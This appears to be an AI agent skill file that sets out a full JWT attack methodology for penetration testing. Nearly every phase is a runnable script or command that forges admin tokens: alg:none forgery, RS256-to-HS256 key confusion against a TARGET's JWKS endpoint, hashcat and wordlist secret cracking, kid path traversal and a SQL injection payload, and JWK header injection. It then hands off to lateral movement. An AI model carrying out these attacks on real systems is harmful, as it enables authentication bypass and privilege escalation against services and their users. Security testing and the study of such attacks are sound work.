---
name: vuln-jwt
description: "JWT vulnerability exploitation. Algorithm confusion (alg:none, RS256→HS256), weak secret cracking, kid injection, JWK header injection, claim manipulation. Triggers: 'jwt', 'json web token', 'jwt attack', 'alg none', 'algorithm confusion', 'rs256 hs256', 'jwt secret', 'kid injection', 'jwk injection', 'jwt bypass', 'jwt forgery'."
---

# JWT Attack Methodology

Full methodology: decode → alg:none → RS256→HS256 confusion → crack → kid injection → JWK injection → claim manipulation.

## Tools

```bash
pip install pyjwt cryptography --break-system-packages
git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool
pip install termcolor cprint pycryptodomex requests --break-system-packages
sudo apt-get install -y hashcat
```

---

## Phase 1: Decode & Inspect

```bash
TOKEN="<paste_token>"

# Decode without verification:
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo

# jwt_tool full decode:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN

# Python decode:
python3 -c "
import base64, json
token = '$TOKEN'
parts = token.split('.')
header  = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))
print('Header:' , json.dumps(header,  indent=2))
print('Payload:', json.dumps(payload, indent=2))
"
```

---

## Phase 2: Algorithm None Attack

```bash
# Try alg:none first — fastest, no key required
python3 -c "
import base64, json, sys

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

token = sys.argv[1]
parts = token.split('.')
header  = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))

payload['role']     = 'admin'
payload['is_admin'] = True
payload['sub']      = '1'

header['alg'] = 'none'
forged = b64url(json.dumps(header)) + '.' + b64url(json.dumps(payload)) + '.'
print(forged)
" $TOKEN

# jwt_tool:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X a
```

---

## Phase 3: RS256 → HS256 Algorithm Confusion

```bash
# If RS256: sign with HS256 using PUBLIC KEY as HMAC secret

# Step 1: Get public key:
curl -s "https://TARGET/.well-known/jwks.json" | jq .
curl -s "https://TARGET/.well-known/openid-configuration" | jq .jwks_uri

# Step 2: Extract PEM:
python3 -c "
import requests, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

jwks = requests.get('https://TARGET/.well-known/jwks.json').json()
key  = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = RSAPublicNumbers(e, n).public_key(default_backend())
print(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode())
" > public_key.pem

# Step 3: Forge HS256 with public key as secret:
python3 -c "
import jwt
with open('public_key.pem', 'rb') as f: pub = f.read()
payload = {'sub': '1', 'role': 'admin', 'iat': 9999999999}
print(jwt.encode(payload, pub, algorithm='HS256'))
"

# jwt_tool automates this:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -S hs256 -k public_key.pem -I -pc role -pv admin
```

---

## Phase 4: Weak Secret Cracking

```bash
# Hashcat (fastest):
echo "$TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Manual common secrets:
for secret in secret password 123456 "" "null" "undefined" \
              "your-256-bit-secret" "secret_key" "jwt_secret" \
              "mysecret" "changeme" "development"; do
  python3 -c "
import jwt, sys
try:
    r = jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])
    print(f'[FOUND] Secret: $secret | Payload: {r}')
except: pass
"
done

# Once secret found — forge admin token:
python3 -c "
import jwt
secret  = 'FOUND_SECRET'
payload = {'sub': '1', 'role': 'admin', 'is_admin': True, 'iat': 9999999999}
print(jwt.encode(payload, secret, algorithm='HS256'))
"
```

---

## Phase 5: kid Header Injection

```bash
# kid → path traversal (empty key via /dev/null):
python3 -c "
import base64, json, hmac, hashlib

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {'alg': 'HS256', 'kid': '../../../dev/null', 'typ': 'JWT'}
payload = {'sub': '1', 'role': 'admin', 'iat': 9999999999}
msg = b64url(json.dumps(header)) + '.' + b64url(json.dumps(payload))
sig = hmac.new(b'', msg.encode(), hashlib.sha256).digest()
print(msg + '.' + b64url(sig))
"

# SQL injection via kid:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -I -hc kid \
  -hv "x' UNION SELECT 'attacker_secret'-- -" \
  -S hs256 -p 'attacker_secret'
```

---

## Phase 6: JWK Header Injection

```bash
# Embed attacker-controlled public key in jwk header

openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# jwt_tool automates:
python3 /opt/jwt_tool/jwt_tool.py $TOKEN -X i -I -pc role -pv admin
```

---

## Phase 7: OAuth / OIDC Discovery Endpoints

```bash
# Check for exposed key endpoints:
for ep in "/.well-known/jwks.json" "/.well-known/openid-configuration" \
          "/api/public-key" "/oauth/jwks" "/auth/jwks"; do
  status=$(curl -o /dev/null -sw '%{http_code}' "https://TARGET$ep")
  [ "$status" = "200" ] && echo "[+] $ep"
done
```

---

## Output

Save findings to `.omop/engagement/vuln/jwt-findings.md`:
- Token decode output
- Successful attack vector (alg:none / confusion / crack / injection)
- Forged token
- Verification proof (API response as admin)
- CVSS: Critical (9.8) if auth bypass achieved

## Next Phase

→ `pentest-exploit` for lateral movement with forged token
→ `pentest-report` for report generation
